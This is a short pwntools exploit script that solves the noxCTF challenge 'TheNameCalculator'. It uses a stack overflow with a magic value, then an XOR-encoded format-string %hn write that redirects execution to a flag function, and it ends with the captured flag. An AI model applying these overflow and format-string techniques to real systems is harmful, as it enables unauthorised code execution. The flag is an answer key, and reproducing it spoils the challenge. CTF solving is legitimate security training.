#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('TheNameCalculator')

host = args.HOST or 'chal.noxale.com'
port = int(args.PORT or 5678)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x080486D5
continue
'''.format(**locals())

# -- Exploit goes here --

def xor(string):
    """
      for ( i = buf; i < (int *)((char *)&buf[-1] + v3); i = (int *)((char *)i + 1) )
        *i ^= 0x5F7B4153u;
    """

    i = 0
    while i + 3 < len(string):
        n = u32(string[i:i+4])
        n ^= 0x5F7B4153
        string = string[:i] + p32(n) + string[i+4:]

        i += 1

    return string

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendafter('?', "A" * 28 + p32(0x6A4B825))

target = 0x0804A024
flag   = 0x08048596

log.info(hex(target))

byte  = 0x8596
log.info(byte)

arg_offset = 12

payload = "{}%{}x%{}$hnAAAABBBB".format(p32(target), byte - 4, arg_offset)
log.info(payload)

io.sendafter('please', xor(payload))

io.interactive()

# noxCTF{M1nd_7he_Input}
